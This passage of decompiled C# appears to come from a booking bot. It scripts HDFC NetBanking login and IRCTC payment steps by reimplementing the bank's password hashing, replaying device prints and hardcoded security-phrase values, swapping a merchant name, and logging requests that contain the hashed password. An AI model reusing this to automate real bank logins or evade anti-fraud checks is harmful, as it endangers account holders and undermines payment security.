(0,0x10000000,0x8,0x10000008,0,0x10000000,0x8,0x10000008,0x400,0x10000400,0x408,0x10000408,0x400,0x10000400,0x408,0x10000408);\n\tpc2bytes10 = new Array (0,0x20,0,0x20,0x100000,0x100020,0x100000,0x100020,0x2000,0x2020,0x2000,0x2020,0x102000,0x102020,0x102000,0x102020);\n\tpc2bytes11 = new Array (0,0x1000000,0x200,0x1000200,0x200000,0x1200000,0x200200,0x1200200,0x4000000,0x5000000,0x4000200,0x5000200,0x4200000,0x5200000,0x4200200,0x5200200);\n\tpc2bytes12 = new Array (0,0x1000,0x8000000,0x8001000,0x80000,0x81000,0x8080000,0x8081000,0x10,0x1010,0x8000010,0x8001010,0x80010,0x81010,0x8080010,0x8081010);\n\tpc2bytes13 = new Array (0,0x4,0x100,0x104,0,0x4,0x100,0x104,0x1,0x5,0x101,0x105,0x1,0x5,0x101,0x105);\n\t//how many iterations (1 for des, 3 for triple des)\n\tvar iterations = key.length > 8 ? 3 : 1; //changed by Paul 16/6/2007 to use Triple DES for 9+ byte keys\n\t//stores the return keys\n\tvar keys = new Array (32 * iterations);\n\t//now define the left shifts which need to be done\n\tvar shifts = new Array (0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0);\n\t//other variables\n\tvar lefttemp, righttemp, m=0, n=0, temp;\n\tfor (var j=0; j<iterations; j++) { //either 1 or 3 iterations\n\tleft = (key.charCodeAt(m++) << 24) | (key.charCodeAt(m++) << 16) | (key.charCodeAt(m++) << 8) | key.charCodeAt(m++);\n\tright = (key.charCodeAt(m++) << 24) | (key.charCodeAt(m++) << 16) | (key.charCodeAt(m++) << 8) | key.charCodeAt(m++);\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\ttemp = ((right >>> -16) ^ left) & 0x0000ffff; left ^= temp; right ^= (temp << -16);\n\ttemp = ((left >>> 2) ^ right) & 0x33333333; right ^= temp; left ^= (temp << 2);\n\ttemp = ((right >>> -16) ^ left) & 0x0000ffff; left ^= temp; right ^= (temp << -16);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\t//the right side needs to be shifted and to get the last four bits of the left side\n\ttemp = (left << 8) | ((right >>> 20) & 0x000000f0);\n\t//left needs to be put upside down\n\tleft = (right << 24) | ((right << 8) & 0xff0000) | ((right >>> 8) & 0xff00) | ((right >>> 24) & 0xf0);\n\tright = temp;\n\t//now go through and perform these shifts on the left and right keys\n\tfor (var i=0; i < shifts.length; i++) {\n\t//shift the keys either one or two bits to the left\n\tif (shifts[i]) {left = (left << 2) | (left >>> 26); right = (right << 2) | (right >>> 26);}\n\telse {left = (left << 1) | (left >>> 27); right = (right << 1) | (right >>> 27);}\n\tleft &= -0xf; right &= -0xf;\n\t//now apply PC-2, in such a way that E is easier when encrypting or decrypting\n\t//this conversion will look like PC-2 except only the last 6 bits of each byte are used\n\t//rather than 48 consecutive bits and the order of lines will be according to\n\t//how the S selection functions will be applied: S2, S4, S6, S8, S1, S3, S5, S7\n\tlefttemp = pc2bytes0[left >>> 28] | pc2bytes1[(left >>> 24) & 0xf]\n\t| pc2bytes2[(left >>> 20) & 0xf] | pc2bytes3[(left >>> 16) & 0xf]\n\t| pc2bytes4[(left >>> 12) & 0xf] | pc2bytes5[(left >>> 8) & 0xf]\n\t| pc2bytes6[(left >>> 4) & 0xf];\n\trighttemp = pc2bytes7[right >>> 28] | pc2bytes8[(right >>> 24) & 0xf]\n\t| pc2bytes9[(right >>> 20) & 0xf] | pc2bytes10[(right >>> 16) & 0xf]\n\t| pc2bytes11[(right >>> 12) & 0xf] | pc2bytes12[(right >>> 8) & 0xf]\n\t| pc2bytes13[(right >>> 4) & 0xf];\n\ttemp = ((righttemp >>> 16) ^ lefttemp) & 0x0000ffff;\n\tkeys[n++] = lefttemp ^ temp; keys[n++] = righttemp ^ (temp << 16);\n\t}\n\t} //for each iterations\n\t//return the keys we've created\n\treturn keys;\n\t} //end of des_createKeys\n\t////////////////////////////// TEST //////////////////////////////\n\tfunction stringToHex (s) {\n\tvar r = \"0x\";\n\tvar hexes = new Array (\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\n\tfor (var i=0; i<s.length; i++) {r += hexes [s.charCodeAt(i) >> 4] + hexes [s.charCodeAt(i) & 0xf];}\n\treturn r;\n\t}\n\tfunction hexToString (h) {\n\tvar r = \"\";\n\tfor (var i= (h.substr(0, 2)==\"0x\")?2:0; i<h.length; i+=2) {r += String.fromCharCode (parseInt (h.substr (i, 2), 16));}\n\treturn r;\n\t}\n\t//-----------------------------------------------------------------------------------------------------\n\t</script>\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
                                    WebBrowser webBrowser = new WebBrowser();
                                    webBrowser.Navigate("about:blank");
                                    webBrowser.Document.Write(text16);
                                    string text17 = webBrowser.Document.InvokeScript("des", new object[4]
                                    {
                                        text2.Substring(0, 8),
                                        text2,
                                        1,
                                        0
                                    }).ToString();
                                    string text18 = webBrowser.Document.InvokeScript("stringToHex", new object[1] { text17 }).ToString();
                                    text18 = text18.ToUpper().Substring(2);
                                    while (text18.Length < 32)
                                    {
                                        text18 += "0";
                                    }
                                    webBrowser.Dispose();
                                    string text19 = "<html>\n<head>\n<script type=\"text/javascript\">\n/*\n\t* jssha256 version 0.1 - Copyright 2006 B. Poettering\n\t*\n\t* This program is free software; you can redistribute it and/or\n\t* modify it under the terms of the GNU General Public License as\n\t* published by the Free Software Foundation; either version 2 of the\n\t* License, or (at your option) any later version.\n\t*\n\t* This program is distributed in the hope that it will be useful,\n\t* but WITHOUT ANY WARRANTY; without even the implied warranty of\n\t* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n\t* General Public License for more details.\n\t*\n\t* You should have received a copy of the GNU General Public License\n\t* along with this program; if not, write to the Free Software\n\t* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA\n\t* 02111-1307 USA\n\t*/\n\t/*\n\t* http://point-at-infinity.org/jssha256/\n\t*\n\t\n\t* This is a JavaScript implementation of the SHA256 secure hash function\n\t* and the HMAC-SHA256 message authentication code (MAC).\n\t*\n\t* The routines' well-functioning has been verified with the test vectors\n\t* given in FIPS-180-2, Appendix B and IETF RFC 4231. The HMAC algorithm\n\t* conforms to IETF RFC 2104.\n\t*\n\t* The following code example computes the hash value of the string \"abc\".\n\t*\n\t* SHA256_init();\n\t* SHA256_write(\"abc\");\n\t* digest = SHA256_finalize();\n\t* digest_hex = array_to_hex_string(digest);\n\t*\n\t* Get the same result by calling the shortcut function SHA256_hash:\n\t*\n\t* digest_hex = SHA256_hash(\"abc\");\n\t*\n\t* In the following example the calculation of the HMAC of the string \"abc\"\n\t* using the key \"secret key\" is shown:\n\t*\n\t* HMAC_SHA256_init(\"secret key\");\n\t* HMAC_SHA256_write(\"abc\");\n\t* mac = HMAC_SHA256_finalize();\n\t* mac_hex = array_to_hex_string(mac);\n\t*\n\t* Again, the same can be done more conveniently:\n\t*\n\t* mac_hex = HMAC_SHA256_MAC(\"secret key\", \"abc\");\n\t*\n\t* Note that the internal state of the hash function is held in global\n\t* variables. Therefore one hash value calculation has to be completed\n\t* before the next is begun. The same applies the the HMAC routines.\n\t*\n\t* Report bugs to: jssha256 AT point-at-infinity.org\n\t*\n\t*/\n\t/******************************************************************************/\n\t/* Two all purpose helper functions follow */\n\t/* string_to_array: convert a string to a character (byte) array */\n\tfunction string_to_array(str) {\n\tvar len = str.length;\n\tvar res = new Array(len);\n\tfor(var i = 0; i < len; i++)\n\tres[i] = str.charCodeAt(i);\n\treturn res;\n\t}\n\t/* array_to_hex_string: convert a byte array to a hexadecimal string */\n\tfunction array_to_hex_string(ary) {\n\tvar res = \"\";\n\tfor(var i = 0; i < ary.length; i++)\n\tres += SHA256_hexchars[ary[i] >> 4] + SHA256_hexchars[ary[i] & 0x0f];\n\treturn res;\n\t}\n\t/******************************************************************************/\n\t/* The following are the SHA256 routines */\n\t/*\n\tSHA256_init: initialize the internal state of the hash function. Call this\n\tfunction before calling the SHA256_write function.\n\t*/\n\t\n\tfunction SHA256_init() {\n\tSHA256_H = new Array(0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,\n\t0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19);\n\tSHA256_buf = new Array();\n\tSHA256_len = 0;\n\t}\n\t/*\n\tSHA256_write: add a message fragment to the hash function's internal state.\n\t'msg' may be given as string or as byte array and may have arbitrary length.\n\t*/\n\tfunction SHA256_write(msg) {\n\tif (typeof(msg) == \"string\")\n\tSHA256_buf = SHA256_buf.concat(string_to_array(msg));\n\telse\n\tSHA256_buf = SHA256_buf.concat(msg);\n\tfor(var i = 0; i + 64 <= SHA256_buf.length; i += 64)\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf.slice(i, i + 64));\n\tSHA256_buf = SHA256_buf.slice(i);\n\tSHA256_len += msg.length;\n\t}\n\t/*\n\tSHA256_finalize: finalize the hash value calculation. Call this function\n\tafter the last call to SHA256_write. An array of 32 bytes (= 256 bits)\n\tis returned.\n\t*/\n\tfunction SHA256_finalize() {\n\tSHA256_buf[SHA256_buf.length] = 0x80;\n\tif (SHA256_buf.length > 64 - 8) {\n\tfor(var i = SHA256_buf.length; i < 64; i++)\n\tSHA256_buf[i] = 0;\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf);\n\tSHA256_buf.length = 0;\n\t}\n\tfor(var i = SHA256_buf.length; i < 64 - 5; i++)\n\tSHA256_buf[i] = 0;\n\tSHA256_buf[59] = (SHA256_len >>> 29) & 0xff;\n\tSHA256_buf[60] = (SHA256_len >>> 21) & 0xff;\n\tSHA256_buf[61] = (SHA256_len >>> 13) & 0xff;\n\tSHA256_buf[62] = (SHA256_len >>> 5) & 0xff;\n\tSHA256_buf[63] = (SHA256_len << 3) & 0xff;\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf);\n\tvar res = new Array(32);\n\tfor(var i = 0; i < 8; i++) {\n\tres[4 * i + 0] = SHA256_H[i] >>> 24;\n\tres[4 * i + 1] = (SHA256_H[i] >> 16) & 0xff;\n\tres[4 * i + 2] = (SHA256_H[i] >> 8) & 0xff;\n\tres[4 * i + 3] = SHA256_H[i] & 0xff;\n\t}\n\tdelete SHA256_H;\n\tdelete SHA256_buf;\n\tdelete SHA256_len;\n\treturn res;\n\t}\n\t/*\n\tSHA256_hash: calculate the hash value of the string or byte array 'msg'\n\tand return it as hexadecimal string. This shortcut function may be more\n\tconvenient than calling SHA256_init, SHA256_write, SHA256_finalize\n\tand array_to_hex_string explicitly.\n\t*/\n\tfunction SHA256_hash(msg) {\n\tvar res;\n\tSHA256_init();\n\tSHA256_write(msg);\n\tres = SHA256_finalize();\n\treturn array_to_hex_string(res);\n\t}\n\t/******************************************************************************/\n\t/* The following are the HMAC-SHA256 routines */\n\t/*\n\tHMAC_SHA256_init: initialize the MAC's internal state. The MAC key 'key'\n\tmay be given as string or as byte array and may have arbitrary length.\n\t*/\n\tfunction HMAC_SHA256_init(key) {\n\tif (typeof(key) == \"string\")\n\tHMAC_SHA256_key = string_to_array(key);\n\telse\n\tHMAC_SHA256_key = new Array().concat(key);\n\tif (HMAC_SHA256_key.length > 64) {\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\tHMAC_SHA256_key = SHA256_finalize();\n\t}\n\tfor(var i = HMAC_SHA256_key.length; i < 64; i++)\n\tHMAC_SHA256_key[i] = 0;\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] ^= 0x36;\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\t}\n\t/*\n\tHMAC_SHA256_write: process a message fragment. 'msg' may be given as\n\tstring or as byte array and may have arbitrary length.\n\t*/\n\tfunction HMAC_SHA256_write(msg) {\n\tSHA256_write(msg);\n\t}\n\t/*\n\tHMAC_SHA256_finalize: finalize the HMAC calculation. An array of 32 bytes\n\t(= 256 bits) is returned.\n\t*/\n\tfunction HMAC_SHA256_finalize() {\n\tvar md = SHA256_finalize();\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] ^= 0x36 ^ 0x5c;\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\tSHA256_write(md);\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] = 0;\n\tdelete HMAC_SHA256_key;\n\treturn SHA256_finalize();\n\t}\n\t/*\n\tHMAC_SHA256_MAC: calculate the HMAC value of message 'msg' under key 'key'\n\t(both may be of type string or byte array); return the MAC as hexadecimal\n\tstring. This shortcut function may be more convenient than calling\n\tHMAC_SHA256_init, HMAC_SHA256_write, HMAC_SHA256_finalize and\n\tarray_to_hex_string explicitly.\n\t*/\n\tfunction HMAC_SHA256_MAC(key, msg) {\n\tvar res;\n\tHMAC_SHA256_init(key);\n\tHMAC_SHA256_write(msg);\n\tres = HMAC_SHA256_finalize()\n\treturn array_to_hex_string(res);\n\t}\n\t/******************************************************************************/\n\t/* The following lookup tables and functions are for internal use only! */\n\tSHA256_hexchars = new Array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n\t'a', 'b', 'c', 'd', 'e', 'f');\n\tSHA256_K = new Array(\n\t0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,\n\t0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,\n\t0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,\n\t0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,\n\t0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,\n\t0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,\n\t0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,\n\t0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,\n\t0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,\n\t0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,\n\t0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2\n\t);\n\tfunction SHA256_sigma0(x) {\n\treturn ((x >>> 7) | (x << 25)) ^ ((x >>> 18) | (x << 14)) ^ (x >>> 3);\n\t}\n\tfunction SHA256_sigma1(x) {\n\treturn ((x >>> 17) | (x << 15)) ^ ((x >>> 19) | (x << 13)) ^ (x >>> 10);\n\t}\n\tfunction SHA256_Sigma0(x) {\n\t\n\treturn ((x >>> 2) | (x << 30)) ^ ((x >>> 13) | (x << 19)) ^\n\t((x >>> 22) | (x << 10));\n\t}\n\tfunction SHA256_Sigma1(x) {\n\treturn ((x >>> 6) | (x << 26)) ^ ((x >>> 11) | (x << 21)) ^\n\t((x >>> 25) | (x << 7));\n\t}\n\tfunction SHA256_Ch(x, y, z) {\n\treturn z ^ (x & (y ^ z));\n\t}\n\tfunction SHA256_Maj(x, y, z) {\n\treturn (x & y) ^ (z & (x ^ y));\n\t}\n\tfunction SHA256_Hash_Word_Block(H, W) {\n\tfor(var i = 16; i < 64; i++)\n\tW[i] = (SHA256_sigma1(W[i - 2]) + W[i - 7] +\n\tSHA256_sigma0(W[i - 15]) + W[i - 16]) & 0xffffffff;\n\tvar state = new Array().concat(H);\n\tfor(var i = 0; i < 64; i++) {\n\tvar T1 = state[7] + SHA256_Sigma1(state[4]) +\n\tSHA256_Ch(state[4], state[5], state[6]) + SHA256_K[i] + W[i];\n\tvar T2 = SHA256_Sigma0(state[0]) + SHA256_Maj(state[0], state[1], state[2]);\n\tstate.pop();\n\tstate.unshift((T1 + T2) & 0xffffffff);\n\tstate[4] = (state[4] + T1) & 0xffffffff;\n\t}\n\tfor(var i = 0; i < 8; i++)\n\tH[i] = (H[i] + state[i]) & 0xffffffff;\n\t}\n\t\n\tfunction SHA256_Hash_Byte_Block(H, w) {\n\tvar W = new Array(16);\n\tfor(var i = 0; i < 16; i++)\n\tW[i] = w[4 * i + 0] << 24 | w[4 * i + 1] << 16 |\n\tw[4 * i + 2] << 8 | w[4 * i + 3];\n\tSHA256_Hash_Word_Block(H, W);\n\t}\n\t/*\n\tPreparing a genric function to be used for generating HMAC_SHA256_MAC.\n\t*/\n\tfunction hex_hmac(key, data)\n\t{\n\treturn HMAC_SHA256_MAC(key, data);\n\t}\n\t\n</script>\n\n<script>\n\nfunction random()\n\t{\n\tvar Pass= Math.floor(10000000 + (Math.random() * (100000000 - 10000000 + 1))); \n\treturn Pass;\n\n}\n\t</script>\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
                                    WebBrowser webBrowser2 = new WebBrowser();
                                    webBrowser2.Navigate("about:blank");
                                    webBrowser2.Document.Write(text19);
                                    string_95 = Conversions.ToString(webBrowser2.Document.InvokeScript("random"));
                                    text15 = webBrowser2.Document.InvokeScript("hex_hmac", new object[2] { string_95, text18 }).ToString();
                                    webBrowser2.Dispose();
                                    text5 = "fldUserAuth=AUTH&fldAppId=XT&fldTxnId=LGN&fldScrnSeqNbr=12&fldLangId=eng&fldDeviceId=01&fldWebServerId=YG&fldAppServerId=ZZ&fldLoginUserId=" + text + "&fldSessionId=&fldDeviceTokenFSO=&fldDevicePrint=" + HttpUtility.UrlEncode(str4) + "&fldTptCustomer=&fldRsaEnrollRequired=N&fldRsaUserStatus=A&fldRsaImageId=image_14140&fldRsaImageHeight=100&fldRsaImageWidth=100&fldRsaImagePath=https%3A%2F%2Fwww.services.cyota.co.uk%2Fgeneric%2Fimages%2Fefamily%2Fstu%2FHouseHome%2F020624_1572_1430_lstpRS.jpg&fldRsaImageText=HouseHome-020624_1572_1430_lstpRS&fldRsaUserPhrase=cupplate&fldUserPhrase=cupplate&OrgReqDate=" + HttpUtility.UrlEncode(str) + "&fldEpiReqId=" + text7 + "&fldRsaAuthReq=Y&fldClientCode=" + text8 + "&fldMerchCode=" + text6 + "&fldClientAccNum=&fldAccReqFlag=N&fldMerchRefNbr=" + text9 + "&fldSucStatFlg=N&fldFailStatFlg=N&fldDatTimeTxn=" + HttpUtility.UrlEncode(text10) + "&fldTxnCurr=INR&fldTxnAmt=" + text11 + "&fldTxnScAmt=" + text12 + "&fldRef1=&fldRef2=&fldRef3=&fldRef4=&fldRef5=&fldRef6=&fldRef7=&fldRef8=&fldRef9=&fldRef10=&fldRef11=&fldDate1=&fldDate2=&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldDisplayDetails=&fldDetails1=&fldDetails2=&fldDetails3=&fldCheckSum=" + text13 + "&fldRandomNumber=" + string_95 + "&fldCustId=" + text + "&fldPassword=" + text15 + "&chkrsastu=on";
                                    string_91 = string_92;
                                    string_92 = "https://netbanking.hdfcbank.com/netbanking/epientry";
                                    clsMain.Lock("Third Hit : Inp = " + text5);
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(3/8)", tCntrlName_, null, null);
                                    }
                                    if (_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0))
                                    {
                                        clsMain.Lock("Third Hit Output = " + string_94);
                                        if (!string_94.Contains("Menu"))
                                        {
                                            if (string_94.Contains("errormessage='"))
                                            {
                                                startIndex = string_94.IndexOf("errormessage='");
                                                startIndex = string_94.IndexOf("'", startIndex) + 1;
                                                length = string_94.IndexOf("'", startIndex) - startIndex;
                                                string_90 = string_94.Substring(startIndex, length).Trim();
                                                if (string_90.Contains("16001"))
                                                {
                                                    string_90 = "You are not registered for NetBanking.";
                                                }
                                                if (string_90.IndexOf("last session was terminated incorrectly", StringComparison.CurrentCultureIgnoreCase) >= 0 && num2 < 7)
                                                {
                                                    Thread.Sleep(300);
                                                    continue;
                                                }
                                            }
                                            if (string.IsNullOrEmpty(string_90) && string_94.Contains("frmResetPassword"))
                                            {
                                                string_90 = "HDFC: Please Reset your Login Password";
                                            }
                                            if (string.IsNullOrEmpty(string_90))
                                            {
                                                string_90 = "Failed while Login into HDFC";
                                            }
                                            clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                                            return false;
                                        }
                                        text3 = clsPostData.smethod_7("", string_94, "input", "fldSessionId");
                                        text4 = clsPostData.smethod_7("", string_94, "input", "fldRequestId");
                                        startIndex = string_94.IndexOf("name=\"fldSessionId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text20 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldRequestId", startIndex);
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text21 = string_94.Substring(startIndex, length).Trim();
                                        text5 = "fldUserAuth=LIST&fldRsaAuthReq=Y&OrgReqDate=&fldEpiReqId=" + text7 + "&fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=05&fldLangId=eng&fldDeviceId=01&fldWebServerId=YG&fldAppServerId=ZZ&fldLoginUserId=" + text + "&fldSessionId=" + text20 + "&fldRequestId=" + text21 + "&customername=&datlastsuccesslogin=&datcurrentlogin=&fldRsaEnrollRequired=N&fldRsaUserStatus=A&fldRsaCollectionRequired=&fldRsaActivityFlag=&fldRsaCollectionType=&fldRsaAuthTxnId=&fldImageId=image_14140&fldImageHeight=100&fldImageWidth=100&fldImagePath=https%3A%2F%2Fwww.services.cyota.co.uk%2Fgeneric%2Fimages%2Fefamily%2Fstu%2FHouseHome%2F020624_1572_1430_lstpRS.jpg&fldImageAltText=HouseHome-020624_1572_1430_lstpRS&fldUserPhrase=cupplate&fldActionType=&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldCheckSum=" + text13;
                                        clsMain.Lock("Fourth Hit : Inp = " + text5);
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(4/8)", tCntrlName_, null, null);
                                        }
                                        if (!_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0))
                                        {
                                            clsMain.Lock("Fourth Hit Failed. err = " + string_93);
                                            string_90 = "Failed while making Payment. Payment Not Done";
                                            break;
                                        }
                                        clsMain.Lock("Fourth Hit Output = " + string_94);
                                        if (!string_94.Contains("You have requested for an electronic payment"))
                                        {
                                            string_90 = "Failed while Processing into HDFC after Login";
                                            clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_90);
                                            break;
                                        }
                                        startIndex = string_94.IndexOf("name=\"fldSessionId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        text20 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldRequestId", startIndex);
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        text21 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldCodOrgBrn", startIndex);
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text22 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("accounts") + 5;
                                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string str5 = string_94.Substring(startIndex, length);
                                        startIndex = string_94.IndexOf("balance", startIndex) + 5;
                                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text23 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("branch", startIndex) + 5;
                                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text24 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("mercName", startIndex) + 5;
                                        startIndex = string_94.IndexOf("'", startIndex) + 1;
                                        length = string_94.IndexOf("'", startIndex) - startIndex;
                                        string text25 = string_94.Substring(startIndex, length).Trim();
                                        text5 = "fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=06&fldSessionId=" + text20 + "&fldRequestId=" + text21 + "&fldCodAcctNo=" + HttpUtility.UrlEncode(str5) + "&fldCodOrgBrn=" + text22 + "&fldAcctList=" + HttpUtility.UrlEncode(str5) + "%7E%3A%3A%7E&fldBalList=" + text23 + "%7E%3A%3A%7E&fldBrnList=" + HttpUtility.UrlEncode(text24) + "%7E%3A%3A%7E&fldCcyList=INR%7E%3A%3A%7E&urlChallanDtl=&fldClientCode=" + text8 + "&fldMerchCode=" + text6 + "&fldMerchRefNo=" + text9 + "&fldMerchName=IRCTC_NEW&fldTxnCurr=INR&fldTxnAmt=" + text11 + "&fldTxnScAmt=" + text12 + "&fldBrnName=" + HttpUtility.UrlEncode(text24) + "&fldRsaTxnType=&fldRsaAuthReq=N&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldAdditionalFields=&fldDevicePrint=" + HttpUtility.UrlEncode(str4);
                                        if (!string.IsNullOrEmpty(value) && text5.Contains("PAYTMIRCTCEC"))
                                        {
                                            text5 = clsPostData.SetPost(text5, "fldMerchName", "CCAFREECHARGEIN");
                                        }
                                        clsMain.Lock("Fifth Hit : Inp = " + text5);
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(5/8)", tCntrlName_, null, null);
                                        }
                                        if (!_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0))
                                        {
                                            clsMain.Lock("Fifth Hit Failed. err = " + string_93);
                                            string_90 = "Failed while making Payment. Payment Not Done";
                                            break;
                                        }
                                        clsMain.Lock("Fifth Hit Output = " + string_94);
                                        startIndex = string_94.IndexOf("name=\"fldRequestId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        text21 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldExtSessionId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text26 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldRemoteAddress");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text27 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("l_rsaTxnId");
                                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text28 = string_94.Substring(startIndex, length).Trim();
                                        text5 = "fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=06&fldSessionId=" + text20 + "&fldRequestId=" + text21 + "&fldMsgSentMode=M&fldMobile=on&fldExtSessionId=" + text26 + "&fldBrnName=" + HttpUtility.UrlEncode(text24) + "&fldDevicePrint=" + HttpUtility.UrlEncode(str4) + "&urlChallanDtl=&fldBrnList=" + HttpUtility.UrlEncode(text24) + "%7E%3A%3A%7E&fldCodOrgBrn=&fldAccountMapFlag=N&fldCodAcctNo=" + HttpUtility.UrlEncode(str5) + "&fldLoginUserGroupType=N&fldIdChannel=1&fldCcyList=INR%7E%3A%3A%7E&fldMerchCode=" + text6 + "&fldTxnAmt=" + text11 + "&fldAcctList=" + HttpUtility.UrlEncode(str5) + "%7E%3A%3A%7E&fldTxnLimitFlag=N&fldTxnCurr=INR&fldRemoteAddress=" + text27 + "&fldLoginUserGroupBaseType=E&fldMerchName=" + text25 + "&fldClientCode=" + text8 + "&fldAdditionalFields=&fldMerchRefNo=" + text9 + "&fldRsaAuthReq=Y&fldProxyUserFlag=N&fldTxnScAmt=" + text12 + "&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldRsaTxnType=&fldBalList=" + text23 + "%7E%3A%3A%7E&fldPinRequired=Y&fldPin=Y&fldPinSequence=1&fldRsaAuthRetry=&fldRsaAuthTxnId=" + text28 + 